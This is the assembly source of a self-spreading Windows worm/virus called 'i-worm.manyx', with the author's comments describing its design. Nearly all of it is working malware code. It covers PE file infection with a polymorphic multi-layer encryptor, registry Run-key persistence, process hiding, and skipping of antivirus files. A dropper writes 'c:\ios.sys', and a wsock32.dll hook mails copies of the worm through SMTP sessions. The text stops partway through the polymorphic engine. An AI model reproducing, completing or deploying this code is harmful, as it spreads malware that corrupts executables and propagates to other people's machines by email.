
;
; i-worm.manyx
; Coded by Bumblebee
;
; DISCLAIMER -
;
; THIS IS THE SOURCE CODE OF A VIRUS/WORM.
;
; IN NO EVENT SHALL THE AUTHOR OF THIS PROGRAM BE LIABLE FOR ANY DIRECT,
; INDIRECT,  INCIDENTAL,  SPECIAL,  EXEMPLARY,  OR CONSEQUENTIAL DAMAGES
; ARISING   IN   ANY   WAY   OUT   OF   THE   USE   OF   THIS  SOFTWARE.
;
; USE  IT AT YOR OWN RISK,  OR DON'T USE IT.  BUT DON'T  FUCK THE CODER!
;
; Some comments:
;
; Think about it as a main body able to install some of its parts (those
; parts are not a complete virus, only the needed stuff to let the  main
; body keep on spreading). When one of those  parts  is  installed,  the
; rest can be removed from the system and the piece still work.
; The way each part work is very determined by the main body. That seems
; so logical for an infected file (the polymorphic  code  usually  never
; changes once the file is  infected), but  is  also  applied  to  wsock
; infection. That is what i call 'slow behavior'.
; However there is a little random part, but is not very important after
; all.
;
; There follows a brief for each part:
;
;  main body: infect wsock32.dll, install, payload and infect PE files
;  wsock32.dll: hook smtp sessions to send a copy of the main body
;  infected file: drop and exec main body
;
; Notice the infected files will exec main body EVER, no matter  if  it
; is installed yet. In that way  the  virus  act  as  a  direct  action
; infector, even infected sample won't infect other files. That's  due,
; once the main body is installed, it will infect all files in  current
; directory (work directory). That means when an  infected  notepad  is
; called by explorer for reading a txt file, it will try  to  drop  the
; main body and exec it. At this point the work directory of  the  main
; body will be notepad's one, so it will  infect  files  there  as  the
; classical direct action infector does.
;
; The only data fixed is the filename where the main body is  saved  in
; each drop. Some random data is based in the C HDD volume name and, in
; wsock case, in the stack of the app sending the  mail.  The  infected
; samples will come from random hotmail address. I know that's not fair
; but most smtp and esmtp servers today check the sender domain exists.
; I'm sure ISPs won't block all hotmail mails (sexyfun.net  is  blocked
; in several ones huehuehue).
;
; Why ios.sys? Simple: it exists in DOS 6.22 (i'm not sure  if  older).
; Due to this is a name you're used to, and you won't delete it.  Win9x
; have a io.sys file, but not ios (at least until you're not infected).
;
; Why the installation name is 8 random letter? Because Hybris and  may
; be other viruses use the same way. A confused user is  nice  when  he
; needs to find help.
;
; Why some strings are encrypted in main body and others not? mmm  I've
; encrypted only some that may show as suspicious. Anyway  it  is  only
; a protection before the file is installed,  and  no  matter  if  that
; ABFDGABC.exe has suspicious strings or not. If you got it, IT'S  VERY
; SUSPICIOUS. In the same way, if the user  peeps  into  wsock32.dll...
; The fact is tested av were not able to detect it in 1st place.
;
; Sometimes filenames found into personal folder (usually my documents)
; will be used to generate the mail to send. Sometimes not. The wsock32
; hook is intended to be full compatible and stable (in fact  it  works
; fine with both blocking and non-blocking sockets, no matter how  slow
; is the connection with the smtp server and what mta you use).
;
; I've coded it with win98 in mind, thus  it  is  the  most  widespread
; win32 compliant system. Indeed most parts will work  in  most  win32.
;
; It uses base64 and MIME 1.0, the payload is not destructive but clear
; enough (and annoying), and there are no comments in the source :)
;
; Have fun.
;
; - main.asm BOF -

%include "win32n.inc"

[extern ExitProcess]
[extern CreateFileMappingA]
[extern GetLastError]

[segment .text]
[global main]

main:
        call    stealthProc

        call    initAux
        jc      exitApp

        call    installMailHook

        call    install
        jnc     exitDeinitApp

        xor     eax,eax
        push    dword regName
        push    dword 1024
        push    eax
        push    dword 4
        push    eax
        dec     eax
        push    eax
        call    CreateFileMappingA
        or      eax,eax
        jz      exitDeinitApp

        push    eax
        call    GetLastError
        pop     ecx
        cmp     eax,0b7h
        je      exitDeinitApp

        push    ecx

        not     dword [fmask]
        call    scandirpe

        call    payload

        call    CloseHandle

exitDeinitApp:
        call    deInitAux

exitApp:
        push    dword 0
        call    ExitProcess

%include "auxf.inc"
%include "payload.inc"
%include "install.inc"
%include "infectpe.inc"
%include "poly.inc"
%include "findfiles.inc"
%include "process.inc"
%include "wsock.inc"

[segment .data]

seed            dd      87654321h
iname           db      '\'
fname           db      0,0,0,0,0,0,0,0
                dd      ~'.exe'
                db      0
regKey          db      "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
regName         db      0,0,0,0,0
hkey            dd      0
drive           db      'c:\',0

encTable        db      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv'
                db      'wxyz0123456789+/'

fmask           dd      ~"*.ex"
                db      'e',0
findHnd         dd      0

perPath         db      "SOFTWARE\Microsoft\Windows\CurrentVersion"
                db      "\Explorer\Shell Folders",0
perValue        db      "Personal",0
PersonalPs      dd      128
fmaskall        dd      ~"*.*"

kernel32dll     db      'KERNEL32.DLL',0
registerSrvProc db      'RegisterServiceProcess',0

wsock32dllp     db      '\'
wsock32dll      dd      ~'wsoc',~'k32.'
                db      'dll',0

wininitstr      dd      ~'[ren',~'ame]'
                db      0dh,0ah
wininitstrLen   equ     $-wininitstr
wininit         dd      ~'\win'
                db      'init.ini',0

dropCode:
%include "dropit.inc"

wsockCode:
%include "wsockhook.inc"

[segment .bss]

memory          resd    1
attachment      resd    1
vsize           resd    1
swidth          resd    1
sheight         resd    1
localtime       resd    4
fHnd            resd    1
mapMem          resd    1
fhmap           resd    1
fileTime0       resd    2
fileTime1       resd    2
fileTime2       resd    2
fileAttrib      resd    1
fileSize        resd    1
padding         resd    1
ccKey           resd    1

poly            resd    1
polySize        resd    1
crptBegin       resd    1
registers       resd    8
freer           resd    1
rIdx            resd    1
rCnt            resd    1
vKey            resd    1
mKey            resd    1
vIdx            resd    1
vCnt            resd    1
lCnt            resd    1
kStack          resd    MAXLAYER 
mStack          resd    MAXLAYER 
finddata:
        dwFileAttributes resd  1
        dwLowDateTime0  resd   1
        dwHigDateTime0  resd   1
        dwLowDateTime1  resd   1
        dwHigDateTime1  resd   1
        dwLowDateTime2  resd   1
        dwHigDateTime2  resd   1
        nFileSizeHigh   resd   1
        nFileSizeLow    resd   1
        dwReserved      resd   2
        cFileName       resb   260
        cAlternateFilename resb 16

PersonalP       resb 128

; - main.asm EOF -
; - payload.inc BOF -

[extern GetDesktopWindow]
[extern LoadIconA]
[extern GetWindowDC]
[extern DrawIcon]
[extern GetSystemMetrics]
[extern GetLocalTime]

payload:
        push    dword localtime
        call    GetLocalTime
        lea     esi,[localtime]
        test    word [esi+2],1
        jnz     doRet
        cmp     word [esi+6],5
        jne     doRet
        test    word [esi+8],8
        jz      doRet
        mov     al,0c3h
doRet   equ     $-1

        push    dword SM_CXFULLSCREEN
        call    GetSystemMetrics
        mov     [swidth],eax

        push    dword SM_CYFULLSCREEN
        call    GetSystemMetrics
        mov     [sheight],eax

        push    dword 32517 ; IDI_WINLOGO
        push    dword 0
        call    LoadIconA

        push    eax

        call    GetDesktopWindow

        push    eax
        call    GetWindowDC

        pop     esi
        mov     edi,eax

iconLoop:
        push    esi
        push    dword [sheight]
        call    rnd
        push    eax
        push    dword [swidth]
        call    rnd
        push    eax
        push    edi
        call    DrawIcon
        jmp     iconLoop

; - payload.inc EOF -

; - auxf.inc BOF -

[extern GetTickCount]
[extern GetModuleFileNameA]
[extern GlobalAlloc]
[extern GlobalFree]
[extern CreateFileA]
[extern GetFileSize]
[extern ReadFile]
[extern CloseHandle]

initAux:
        push    ebp
        mov     ebp,esp
        sub     esp,260
        push    ebp
        sub     ebp,260

        push    dword localtime
        call    GetLocalTime

        call    GetTickCount
        add     eax,dword [localtime+8]
        add     [seed],eax

        push    dword 260
        push    ebp
        push    dword 0
        call    GetModuleFileNameA
        or      eax,eax
        jz      near initAuxKO

        push    dword 0
        push    dword 80h
        push    dword 3
        push    dword 0
        push    dword 1
        push    dword 80000000h
        push    ebp
        call    CreateFileA
        inc     eax
        jz      near initAuxKO
        dec     eax

        push    eax
        push    dword 0
        push    eax
        call    GetFileSize
        pop     esi
        mov     edi,eax

        mov     dword [vsize],eax
        mov     dword [dropSize],eax

        add     eax,5
        push    eax
        add     eax,eax
        add     eax,eax
        add     eax,eax
        add     eax,eax
        push    eax
        push    dword GMEM_FIXED
        call    GlobalAlloc
        or      eax,eax
        jz      near initAuxKO

        mov     [memory],eax
        pop     ecx
        add     ecx,eax
        mov     [attachment],ecx

        push    dword 0h
        push    ebp
        push    edi
        push    eax
        push    esi
        call    ReadFile

        push    esi
        call    CloseHandle

        mov     eax,[vsize]
        xor     edx,edx
        mov     ecx,3
        div     ecx
        or      edx,edx
        jz      incredible
        inc     eax
incredible:
        mul     ecx
        mov     ecx,eax
        mov     eax,[memory]
        mov     edx,[attachment]
        call    encodeBase64
        mov     [attachmentSize],ecx

otherKeyPlz:
        push    dword 0ffh
        call    rnd
        or      al,al
        jz      otherKeyPlz
        mov     [ccKey],al
        mov     [cKey],al

        mov     esi,[memory]
        xor     eax,eax
        mov     al,[ccKey]
        mov     ecx,[dropSize]
encryptItLoop:
        not     byte [esi]
        xor     byte [esi],al
        inc     ax
        inc     esi
        loop    encryptItLoop

        call    genFileName

        mov     eax,(MAXPOLY*MAXLAYER)
        add     eax,dropperSize+5
        add     eax,[vsize]
        push    eax
        push    dword GMEM_FIXED
        call    GlobalAlloc
        or      eax,eax
        jz      initAuxKO

        mov     [poly],eax

        call    getPersonal

        clc
        mov     al,0f9h
initAuxKO       equ $-1
        pop     ebp
        leave
        ret

deInitAux:
        push    dword [poly]
        call    GlobalFree

        push    dword [memory]
        call    GlobalFree
        ret

genFileName:
        lea     edi,[fname]
        mov     ecx,8
        not     dword [edi+ecx]
fileName:
        push    ecx
        push    dword 10
        call    rnd
        pop     ecx
        add     eax,'A'
        stosb
        loop    fileName
        ret

rnd:
        mov     eax,[seed]
        imul    eax,9E3779B9h
        shr     eax,16
        add     [seed],eax
        xor     edx,edx
        mov     ecx,[esp+4]
        div     ecx
        mov     eax,edx
        retn    4

getPersonal:
        push    dword hkey
        push    dword 0
        push    dword 0
        push    dword perPath
        push    dword HKEY_CURRENT_USER
        call    RegOpenKeyExA
        or      eax,eax
        jnz     personalKO

        push    dword PersonalPs
        push    dword PersonalP
        push    eax
        push    eax
        push    dword perValue
        push    dword [hkey]
        call    RegQueryValueExA
        or      eax,eax
        jnz     personalKO

        push    dword [hkey]
        call    RegCloseKey

        mov     byte [pflag],1
outtaPersonal:
        ret
personalKO:
        mov     byte [pflag],0
        jmp     outtaPersonal

isAV:
        push    edi
UCaseLoop:
        cmp     byte [edi],'a'
        jb      notUCase
        cmp     byte [edi],'z'
        ja      notUCase
        sub     byte [edi],'a'-'A'
notUCase:
        inc     edi
        mov     al,[edi]
        or      al,al
        jnz     UCaseLoop
        pop     edi
avStrLoop:
        mov     ax,word [edi]
        not     ax
        cmp     ax,~'AV'
        je      itIsAV
        cmp     ax,~'DR'
        je      itIsAV
        cmp     ax,~'SP'
        je      itIsAV
        cmp     ax,~'F-'
        je      itIsAV
        cmp     ax,~'AN'
        je      itIsAV
        cmp     ax,~'VE'
        je      itIsAV
        cmp     ax,~'CL'
        je      itIsAV
        cmp     ax,~'ON'
        je      itIsAV
        not     ax
        inc     edi
        or      ah,ah
        jnz     avStrLoop

        clc
        mov     al,0f9h
itIsAV  equ $-1
        ret

encodeBase64:
        xor     esi,esi
        lea     edi,[encTable]
        push    ebp
        xor     ebp,ebp
baseLoop:

        xor     ebx,ebx
        mov     bl,byte [eax]
        shr     bl,2
        and     bl,00111111b
        mov     bh,byte [edi+ebx]
        mov     byte [edx+esi],bh
        inc     esi

        mov     bx,word [eax]
        xchg    bl,bh
        shr     bx,4
        mov     bh,0
        and     bl,00111111b
        mov     bh,byte [edi+ebx]
        mov     byte [edx+esi],bh
        inc     esi

        inc     eax
        mov     bx,word [eax]
        xchg    bl,bh
        shr     bx,6
        mov     bh,0
        and     bl,00111111b
        mov     bh,byte [edi+ebx]
        mov     byte [edx+esi],bh
        inc     esi

        inc     eax
        xor     ebx,ebx
        mov     bl,byte [eax]
        and     bl,00111111b
        mov     bh,byte [edi+ebx]
        mov     byte [edx+esi],bh
        inc     esi
        inc     eax

        inc     ebp
        cmp     ebp,24
        ja      addEndOfLine
        inc     ebp

addedEndOfLine:
        sub     ecx,3
        or      ecx,ecx
        jnz     baseLoop

        mov     ecx,esi
        add     edx,esi
        pop     ebp
        ret

addEndOfLine:
        xor     ebp,ebp
        mov     word [edx+esi],0a0dh
        add     esi,2
        jmp     addedEndOfLine

; - auxf.inc EOF -
; - install.inc BOF -

[extern GetWindowsDirectoryA]
[extern lstrcat]
[extern RegOpenKeyExA]
[extern RegQueryValueExA]
[extern RegSetValueExA]
[extern RegCloseKey]
[extern CreateFileA]
[extern WriteFile]
[extern CloseHandle]
[extern GetVolumeInformationA]

install:
        push    ebp
        mov     ebp,esp
        sub     esp,260
        push    ebp
        sub     ebp,260

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    eax
        push    dword regName
        push    eax
        push    eax
        push    dword drive
        call    GetVolumeInformationA
        or      eax,eax
        jz      near installKO

        and     dword [regName],0f0f0f0fh
        or      dword [regName],"abcd"

        push    dword 20h
        call    rnd
        or      eax,eax
        jz      near installOK

        push    dword hkey
        push    dword KEY_ALL_ACCESS
        push    dword 0
        push    dword regKey
        push    dword HKEY_LOCAL_MACHINE
        call    RegOpenKeyExA
        or      eax,eax
        jnz     near installKO

        push    eax
        push    eax
        push    dword localtime
        push    eax
        push    dword regName
        push    dword [hkey]
        call    RegQueryValueExA
        or      eax,eax
        jz      near installKO

        push    dword 260
        push    ebp
        call    GetWindowsDirectoryA
        or      eax,eax
        jz      near installKO

        push    dword iname
        push    ebp
        call    lstrcat

        push    dword 0
        push    dword 3
        push    dword 2
        push    dword 0
        push    dword 0
        push    dword 40000000h
        push    ebp
        call    CreateFileA
        inc     eax
        jz      installKO
        dec     eax

        push    eax
        push    dword 0
        push    dword localtime
        push    dword [vsize]
        push    dword [memory]
        push    eax
        call    WriteFile

        call    CloseHandle

        push    dword 260
        push    ebp
        push    dword REG_SZ
        push    dword 0
        push    dword regName
        push    dword [hkey]
        call    RegSetValueExA

        push    dword [hkey]
        call    RegCloseKey

installOK:
        clc
        mov     al,0f9h
installKO       equ $-1
        pop     ebp
        leave
        ret

; - install.inc EOF -
; - dropit.inc BOF -

KERNEL32        equ     0bff70000h

dropBegin:
        push    dword 12345678h
hostEP  equ     $-4
        pushad

        cmp     byte [esp+27h],0bfh
        jne     near notWin9x

        call    k32Tip
        mov     eax,dword [eax+edi]
        add     eax,edi

        mov     ebp,eax

        call    decryptIt

        call    dropIt

        call    execIt
notWin9x:
        popad
        ret

dropIt:
        mov     ecx,3
        mov     ah,byte 3ch
        call    getDelta
        add     edx,file2drop
        call    int21h
        jnc     openok
        ret
openok:
        xchg    eax,ebx

        mov     ah,40h
        mov     ecx,12345678h
dropSize        equ $-4
        call    getDelta
        add     edx,data2drop
        call    int21h

        mov     ah,3eh
        call    int21h
        ret

execIt:
        call    getDelta
        mov     ebp,edx
        call    k32Tip
        add     eax,edi
        mov     dword [address+ebp],eax
        lodsd
        add     eax,edi
        mov     dword [names+ebp],eax
        lodsd
        add     eax,edi
        mov     dword [ordinals+ebp],eax

        xor     edx,edx
        lea     esi,[winexecsz+ebp]
        mov     ecx,winexeclen
searchl:
        push    ecx
        push    esi
        mov     edi,dword [names+ebp]
        add     edi,edx
        mov     edi,dword [edi]
        add     edi,KERNEL32
        rep     cmpsb
        je      fFound
        add     edx,4
        pop     esi
        pop     ecx
        jmp     searchl
fFound:
        pop     esi
        pop     ecx
        shr     edx,1
        add     edx,dword [ordinals+ebp]
        movzx   ebx,word [edx]
        shl     ebx,2
        add     ebx,dword [address+ebp]
        mov     ecx,dword [ebx]
        add     ecx,KERNEL32

        push    dword 0
        lea     esi,[file2drop+ebp]
        push    esi
        call    ecx
        ret

getDelta:
        call    delta
delta:
        pop     edx
        sub     edx,dword delta
        ret
int21h:
        push    ecx
        push    eax
        push    dword 002a0010h
        call    ebp
        ret

decryptIt:
        call    getDelta
        mov     ecx,[dropSize+edx]
        add     edx,data2drop
        xor     eax,eax
        mov     al,0ffh
cKey    equ     $-1
decryptItLoop:
        xor     byte [edx],al
        not     byte [edx]
        inc     edx
        inc     ax
        loop    decryptItLoop
        ret

k32Tip:
        mov     edi,KERNEL32
        mov     esi,KERNEL32+3ch
        lodsd
        add     eax,edi
        xchg    eax,esi
        mov     esi,dword [esi+78h]
        add     esi,dword 1ch+KERNEL32
        lodsd
        ret

winexecsz       db      "WinExec"
winexeclen      equ     $-winexecsz
address         dd      0
names           dd      0
ordinals        dd      0
file2drop       db      'c:\ios.sys',0
dropperSize     equ $-dropBegin
data2drop:

; - dropit.inc EOF -

; - infectpe.inc BOF -

[extern CreateFileA]
[extern CloseHandle]
[extern GetFileAttributesA]
[extern SetFileAttributesA]
[extern GetFileSize]
[extern GetFileTime]
[extern SetFileTime]
[extern CreateFileMappingA]
[extern MapViewOfFile]
[extern UnmapViewOfFile]

PADDING equ     101

infectpe:
        push    esi

        push    esi
        call    GetFileAttributesA
        pop     esi
        inc     eax
        jz      near infectionError
        dec     eax

        mov     dword [fileAttrib],eax

        push    esi
        push    dword 80h
        push    esi
        call    SetFileAttributesA
        pop     esi
        or      eax,eax
        jz      near infectionError

        push    esi

        push    dword 0
        push    dword 80h
        push    dword 3
        push    dword 0
        push    dword 0
        push    dword (80000000h | 40000000h)
        push    esi
        call    CreateFileA
        inc     eax
        jz      near infectionErrorAttrib
        dec     eax

        mov     [fHnd],eax

        push    dword 0
        push    eax
        call    GetFileSize
        inc     eax
        jz      near infectionErrorClose
        dec     eax

        mov     [fileSize],eax

        push    dword fileTime2
        push    dword fileTime1
        push    dword fileTime0
        push    dword [fHnd]
        call    GetFileTime
        or      eax,eax
        jz      near infectionErrorClose

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd]
        call    CreateFileMappingA
        or      eax,eax
        jz      near infectionErrorClose

        mov     dword [fhmap],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap]
        call    MapViewOfFile
        or      eax,eax
        jz      near infectionErrorCloseMap

        mov     [mapMem],eax

        mov     edi,eax
        cmp     word [edi],'MZ'
        jne     near infectionErrorCloseUnmap

        add     edi,[edi+3ch]
        cmp     eax,edi
        jae     near infectionErrorCloseUnmap
        add     eax,[fileSize]
        cmp     eax,edi
        jbe     near infectionErrorCloseUnmap
        cmp     word [edi],'PE'
        jne     near infectionErrorCloseUnmap

        movzx   edx,word [edi+16h]
        test    edx,2h
        jz      near infectionErrorCloseUnmap
        and     edx,2000h
        jnz     near infectionErrorCloseUnmap
        mov     dx,[edi+5ch]
        dec     edx
        jz      near infectionErrorCloseUnmap

        cmp     word [edi+1ch],0
        je      near infectionErrorCloseUnmap

        mov     esi,edi
        mov     eax,18h
        add     ax,[edi+14h]
        add     edi,eax

        mov     cx,[esi+06h]
        dec     cx
        mov     eax,28h
        mul     cx
        add     edi,eax

        mov     ecx,[edi+14h]
        add     ecx,[edi+10h]

        cmp     ecx,[fileSize]
        jne     near infectionErrorCloseUnmap

        mov     eax,[edi+0ch]
        add     eax,[edi+10h]
        mov     [crptBegin],eax
        xchg    eax,[esi+28h]
        mov     ecx,[esi+34h]
        add     [crptBegin],ecx
        add     dword [crptBegin],5
        add     eax,ecx
        mov     [hostEP],eax

        pushad
        mov     edi,[poly]
        mov     al,0e8h
        stosb
        xor     eax,eax
        add     eax,dropperSize
        add     eax,[vsize]
        stosd
        lea     esi,[dropBegin]
        mov     ecx,dropperSize
        rep     movsb

        mov     esi,[memory]
        mov     ecx,[vsize]
        rep     movsb

        mov     esi,[crptBegin]
        call    genPolyData
        mov     [polySize],ecx
        popad

        xor     eax,eax
        mov     [esi+58h],eax

        or      dword [edi+24h],0c0000000h

        mov     eax,dropperSize+5
        add     eax,[vsize]
        add     eax,[polySize]
        push    eax
        add     eax,[edi+10h]
        mov     ecx,[esi+3ch]
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     [edi+10h],eax

        add     eax,[edi+0ch]
        mov     ecx,[esi+38h]
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     [esi+50h],eax
        sub     eax,[edi+0ch]
        mov     [edi+08h],eax

        pop     eax
        add     eax,[fileSize]
        mov     ecx,PADDING
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     [padding],eax

        push    dword [mapMem]
        call    UnmapViewOfFile

        push    dword [fhmap]
        call    CloseHandle

        xor     eax,eax
        push    eax
        push    dword [padding]
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd]
        call    CreateFileMappingA
        or      eax,eax
        jz      infectionErrorClose

        mov     [fhmap],eax

        xor     eax,eax
        push    dword [padding]
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap]
        call    MapViewOfFile
        or      eax,eax
        jz      infectionErrorCloseMap

        mov     [mapMem],eax

        mov     ecx,dropperSize+5
        add     ecx,[vsize]
        add     ecx,[polySize]
        mov     esi,[poly]
        mov     edi,eax
        add     edi,dword [fileSize]
        rep     movsb

infectionErrorCloseUnmap:
        push    dword [mapMem]
        call    UnmapViewOfFile

infectionErrorCloseMap:
        push    dword [fhmap]
        call    CloseHandle

        push    dword fileTime2
        push    dword fileTime1
        push    dword fileTime0
        push    dword [fHnd]
        call    SetFileTime

infectionErrorClose:
        push    dword [fHnd]
        call    CloseHandle

infectionErrorAttrib:
        pop     esi
        push    dword [fileAttrib]
        push    esi
        call    SetFileAttributesA

infectionError:
        ret

genPolyData:
        push    dword MAXLAYER/2
        call    rnd
        add     eax,MAXLAYER/2

        mov     [lCnt],eax
        mov     ecx,eax

        push    edi
genPolyDataL:
        push    esi
        push    ecx
        push    edi
        mov     ecx,dropperSize
        add     ecx,[vsize]
        call    brepoge
        pop     edi
        add     edi,ecx

        pop     ecx

        mov     eax,[vKey]
        mov     [kStack-4+ecx*4],eax
        mov     eax,[mKey]
        mov     [mStack-4+ecx*4],eax

        pop     esi
        loop    genPolyDataL

        mov     al,0c3h
        stosb

        mov     ecx,[lCnt]
        xor     esi,esi
encryptLayers:
        mov     ebx,[kStack+esi]
        mov     edx,[mStack+esi]
        push    esi
        push    ecx
        call    encryptLayer
        pop     ecx
        pop     esi
        add     esi,4
        loop    encryptLayers

        pop     esi
        sub     edi,esi
        mov     ecx,edi
        ret

encryptLayer:
        mov     esi,[poly]
        add     esi,5
        mov     eax,[vsize]
        add     eax,dropperSize
        test    ebx,1
        jz      _encryptLayer8
        shr     eax,1
        mov     ecx,eax
_encryptLayer16l:
        or      edx,edx
        jz      _encryptXOR16
        cmp     edx,_ADD
        je      _encryptADD16
        add     [esi],bx
        jmp     _encryptFNCOK16
_encryptADD16:
        sub     [esi],bx
        jmp     _encryptFNCOK16
_encryptXOR16:
        xor     [esi],bx
_encryptFNCOK16:
        add     esi,2
        loop    _encryptLayer16l
        ret
_encryptLayer8:
        mov     ecx,eax
_encryptLayer8l:
        or      edx,edx
        jz      _encryptXOR8
        cmp     edx,_ADD
        je      _encryptADD8
        add     [esi],bl
        jmp     _encryptFNCOK8
_encryptADD8:
        sub     [esi],bl
        jmp     _encryptFNCOK8
_encryptXOR8:
        xor     [esi],bl
_encryptFNCOK8:
        inc     esi
        loop    _encryptLayer8l
        ret

; - infectpe.inc EOF -

; - findfiles.inc BOF -

[extern FindFirstFileA]
[extern FindNextFileA]
[extern FindClose]
[extern SetCurrentDirectoryA]
[extern GetCurrentDirectoryA]
[extern MessageBoxA]

scandirpe:
        push    dword finddata
        push    dword fmask
        call    FindFirstFileA
        inc     eax
        jz      notFound
        dec     eax

        mov     dword [findHnd],eax

findNext:
        mov     eax,dword [nFileSizeLow]
        cmp     eax,2000h
        jb      skipThisFile
        mov     ecx,PADDING
        xor     edx,edx
        div     ecx
        or      edx,edx
        jz      skipThisFile

        lea     esi,[cFileName]

        mov     edi,esi
        call    isAV
        jc      skipThisFile

        call    infectpe

skipThisFile:
        push    dword finddata
        push    dword [findHnd]
        call    FindNextFileA
        or      eax,eax
        jnz     findNext

endScan:
        push    dword [findHnd]
        call    FindClose

notFound:
        ret

scansubject:
        push    ebp
        mov     ebp,esp
        sub     esp,260
        push    ebp
        sub     ebp,260

        cmp     byte [pflag],1
        jne     near notFoundSubj

        push    ebp
        push    dword 260
        call    GetCurrentDirectoryA
        or      eax,eax
        jz      near notFoundSubjKO

        push    dword PersonalP
        call    SetCurrentDirectoryA
        or      eax,eax
        jz      near notFoundSubjKOBACK

        push    dword finddata
        push    dword fmaskall
        call    FindFirstFileA
        inc     eax
        jz      near notFoundSubjKOBACK
        dec     eax

        mov     dword [findHnd],eax

findNextSubj:
        xor     edx,edx
        mov     dword [ssubj],edx
        lea     esi,[cFileName]
        lea     edi,[gsubject]
storeSubjLoop:
        lodsb
        cmp     al,'.'
        jne     notDot
        xor     eax,eax
notDot:
        cmp     al,'"'
        je      storeSubjLoop
        stosb
        inc     edx
        or      al,al
        jz      subjOk
        cmp     edx,63
        je      subjOk
        jmp     storeSubjLoop
subjOk:
        dec     edx
        mov     dword [ssubj],edx

        push    dword 10h
        call    rnd
        or      eax,eax
        jz      endScanSubj

        push    dword finddata
        push    dword [findHnd]
        call    FindNextFileA
        or      eax,eax
        jnz     findNextSubj

endScanSubj:
        push    dword [findHnd]
        call    FindClose

        push    ebp
        call    SetCurrentDirectoryA

        cmp     dword [ssubj],4
        jb      notFoundSubjKO

notFoundSubj:
        pop     ebp
        leave
        ret

notFoundSubjKOBACK:
        push    ebp
        call    SetCurrentDirectoryA

notFoundSubjKO:
        mov     byte [pflag],0
        pop     ebp
        leave
        ret

; - findfiles.inc EOF -
; - process.inc BOF -

[extern LoadLibraryA]
[extern GetProcAddress]

stealthProc:
        push    dword kernel32dll
        call    LoadLibraryA

        push    dword registerSrvProc
        push    eax
        call    GetProcAddress
        or      eax,eax
        jz      notStealthProc

        push    dword 1
        push    dword 0
        call    eax

notStealthProc:
        ret

; - process.inc EOF -

; - poly.inc BOF -

MAXPOLY         equ     512
MAXLAYER        equ     32 ; from 16 to 32 layers = max about 16kbs poly

_EAX            equ     0
_ECX            equ     1
_EDX            equ     2
_EBX            equ     3
_ESP            equ     4
_EBP            equ     5
_ESI            equ     6
_EDI            equ     7

_XOR            equ     0
_ADD            equ     1
_SUB            equ     2

;
; BREPOGE
;
; it uses simple [XOR|ADD|SUB] as encryption function
; the keys used will be 16 or 8 bits
;
; junk is generated using the same schemes than algorithm code
;
; most basic don't support esp, so don't use esp
;
; check infectpe.inc to see 'how to multi-layer'
;
; brepoge usage:
;
;  in: edi destination buffer
;      esi idx init
;      ecx size to encrypt
; out: ecx size of generated code
;
; required: extern DWORD rnd(DWORD top) -> return rnd number from 0 to top
;
; description of generation scheme:
;
; basic
;
; bmov r32,i32: lea r32,[i32]
;               mov r32,i32
;               push i32 / pop r32
;
; bmov r32,rb32: mov r32,rb32
;                push rb32 / pop r32
;
; baddsub r32,i32: add r32,-i32
;                  sub r32,i32
; push r32
; pop  r32
; push i32
; add r32,i32
; sub r32,i32
; xor [r32],i16/8
; add [r32],i16/8
; sub [r32],i16/8
; or r32,r32 (cmp r32,0)
;
; complex (recursive)
;
; cmov r32,rb32: bmov r32,rb32
;                cmov rt32,rb32 / cmov r32,rt32
;
; cmov r32,i32: bmov r32,i32
;               cmov r32,i32+mod / baddsub r32,mod
;               cmov rt32,i32 / cmov r32,rt32
;
; TO DO
;
; + garbage generator
; + more recursive shit (calls, jmps, cmps)
; + add other encryption funcs (ror/rol)
; + add key slide to encryption algorithm
;
; Just coded to avoid naked viruses :)
;
brepoge:
        push    edi

        mov     [vIdx],esi
        mov     [vCnt],ecx

        push    edi
        lea     edi,[registers]
        xor     eax,eax
        stosd
        stosd
        pop     edi
        mov     byte [registers+_ESP],1
        mov     byte [freer],6

        call    junk

        push    dword 2
        call    rnd
        mov     [mKey],eax

        call    getFreeReg
        mov     [rIdx],eax
        call    getFreeReg
        mov     [rCnt],eax

        push    dword -1
        call    rnd
        test    eax,1
        jz      key8bits
        push    eax
        push    dword -1
        call    rnd
        rol     eax,8
        pop     edx
        adc     eax,edx
        or      eax,1
        jmp     dontclip
key8bits:
        and     eax,0feh
dontclip:
        mov     [vKey],eax

        test    eax,1
        jz      fullcounter

        mov     eax,[vCnt]
        shr     eax,1
        mov     [vCnt],eax
fullcounter:

        push    dword 2
        call    rnd
        or      eax,eax
        jz      callbk00

        call    bk01
        call    junk
        call    bk00
        jmp     endbk00s
callbk00:
        call    bk00
        call    junk
        call    bk01
endbk00s:

        push    edi

        call    junk

        mov     eax,[mKey]
        or      eax,eax
        jz      doXOR

        cmp     eax,_ADD
        je      doADD

        mov     eax,[rIdx]
        mov     edx,[vKey]
        call    _submri
        jmp     endFUNCTION
doADD:
        mov     eax,[rIdx]
        mov     edx,[vKey]
        call    _addmri
        jmp     endFUNCTION
doXOR:
        mov     eax,[rIdx]
        mov     edx,[vKey]
        call    _xormri
endFUNCTION:

        push    dword 2
        call    rnd
        or      eax,eax
        jz      callbk0

        call    bk1
        call    junk
        call    bk0
        jmp     endbks
callbk0:
        call    bk0
        call    junk
        call    bk1
endbks:

        mov     eax,[rCnt]
        call    _orrr

        pop     esi
        sub     esi,edi
        sub     esi,6

        mov     ax,850fh
        stosw
        mov     eax,esi
        stosd

        call    junk

        pop     ecx
        sub     edi,ecx
        xchg    ecx,edi
        ret
bk00:
        mov     eax,[rIdx]
        mov     edx,[vIdx]
        call    cmovri
        ret
bk01:
        mov     eax,[rCnt]
        mov     edx,[vCnt]
        call    cmovri
        ret
bk0:
        call    getFreeReg
        push    eax
        mov     edx,[rIdx]
        mov     ah,dl
        xchg    ah,al
        call    cmovrr

        mov     eax,[esp]
        xor     edx,edx
        dec     edx
        test    dword [vKey],1
        jz      key8bitsb
        dec     edx
key8bitsb:
        call    baddsub

        mov     eax,[esp]
        mov     edx,[rIdx]
        mov     ah,dl
        call    cmovrr

